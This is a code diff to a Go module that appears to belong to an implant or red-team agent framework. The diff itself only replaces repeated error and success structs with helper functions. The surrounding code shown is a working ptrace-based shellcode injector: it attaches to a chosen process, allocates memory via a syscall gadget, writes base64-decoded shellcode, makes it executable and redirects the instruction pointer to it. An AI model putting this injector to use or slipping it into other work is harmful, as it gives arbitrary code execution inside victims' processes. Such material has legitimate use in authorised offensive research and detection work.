@@ -32,20 +32,12 @@ type ptraceInjectArgs struct {
 
 func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required. Actions: check, inject",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required. Actions: check, inject")
 	}
 
 	var args ptraceInjectArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	action := strings.ToLower(args.Action)
@@ -59,11 +51,7 @@ func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	case "inject":
 		return ptraceInject(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: check, inject", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s\nAvailable: check, inject", args.Action)
 	}
 }
 
@@ -151,45 +139,25 @@ func ptraceCheck() structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if args.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: valid pid required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: valid pid required")
 	}
 
 	if args.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 required (base64-encoded shellcode)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 required (base64-encoded shellcode)")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: shellcode is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode is empty")
 	}
 
 	restore := true
@@ -209,11 +177,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 
 	// Verify target process exists
 	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID))
 	}
 
 	// Lock the OS thread — ptrace requires all operations from the same thread
@@ -223,22 +187,14 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	// Step 1: Attach to the process
 	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
 	if err := syscall.PtraceAttach(args.PID); err != nil {
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
 	}
 
 	// Wait for the process to stop (SIGSTOP)
 	var ws syscall.WaitStatus
 	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
 	}
 	sb.WriteString("[+] Process stopped\n")
 
@@ -246,11 +202,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))
 
@@ -258,11 +210,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	syscallAddr, err := findSyscallGadget(args.PID)
 	if err != nil {
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))
 
@@ -307,20 +255,12 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
 	}
 	if rwAddr >= 0xfffffffffffff000 {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", rwAddr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", rwAddr))
 	}
 	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", rwAddr, pageSize))
 
@@ -335,11 +275,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))
 
@@ -348,11 +284,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
 	}
 	if mprotectRet != 0 {
 		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
@@ -372,11 +304,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))
 
@@ -385,11 +313,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err := syscall.PtraceCont(args.PID, 0); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
 	}
 
 	if restore {
@@ -413,11 +337,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
 			sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
 			_ = syscall.PtraceDetach(args.PID)
-			return structs.CommandResult{
-				Output:    sb.String(),
-				Status:    "success",
-				Completed: true,
-			}
+			return successResult(sb.String())
 		}
 
 		if ws.StopSignal() == syscall.SIGTRAP {
@@ -456,11 +376,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 
 	sb.WriteString("[+] Ptrace injection completed successfully\n")
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // findSyscallGadget scans r-xp memory regions for a syscall instruction (0x0F 0x05).
